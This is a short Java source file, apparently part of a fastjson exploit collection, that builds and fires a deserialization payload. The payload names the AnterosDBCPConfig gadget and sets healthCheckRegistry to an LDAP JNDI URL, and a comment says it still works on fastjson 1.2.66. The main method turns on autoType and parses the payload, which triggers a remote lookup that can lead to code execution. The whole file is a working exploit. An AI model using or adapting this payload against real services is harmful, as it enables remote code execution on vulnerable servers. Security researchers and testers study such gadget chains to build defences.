package fastjsonExp;

import br.com.anteros.dbcp.AnterosDBCPConfig;
import utils.FastjsonVersionCtr;
import utils.StringUtils;

/**
 * 完成
 * br.com.anteros.dbcp.AnterosDBCPConfig
 * still work at fastjson 1.2.66
 */

public class EXP4com_anteros {
    //payload="{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://127.0.0.1:1389/run\"}";
    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"replace_here\"}";
    public  void actual_fun(String url){
        AnterosDBCPConfig a = new AnterosDBCPConfig();
        a.setHealthCheckRegistry(url);
    }
    public  void actual_fun(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public EXP4com_anteros(){}
    public EXP4com_anteros(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);
        System.out.println(this.payload);
    }
    public String getPayload(){
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.66");
        myFastjson.mySetAutoType(true);
        EXP4com_anteros exp = new EXP4com_anteros("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        myFastjson.clear();
    }
}
